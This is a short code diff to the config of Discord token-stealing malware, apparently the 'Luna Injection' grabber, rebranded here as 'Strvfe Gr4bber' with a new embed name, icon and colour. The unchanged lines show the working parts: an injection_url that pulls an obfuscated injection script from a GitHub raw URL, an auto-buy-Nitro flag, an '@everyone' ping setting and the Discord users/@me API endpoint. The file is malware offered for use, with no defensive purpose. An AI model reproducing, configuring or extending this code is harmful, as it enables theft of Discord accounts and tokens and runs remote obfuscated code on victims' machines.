@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Luna Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'),
-  embed_color: 5639644, 
+  embed_name: 'Strvfe Gr4bber', 
+  embed_icon: 'https://i.pinimg.com/564x/68/95/31/689531dc04ba222ab7af0fa34dc63644.jpg'.replace(/ /g, '%20'),
+  embed_color: 000000, 
   injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
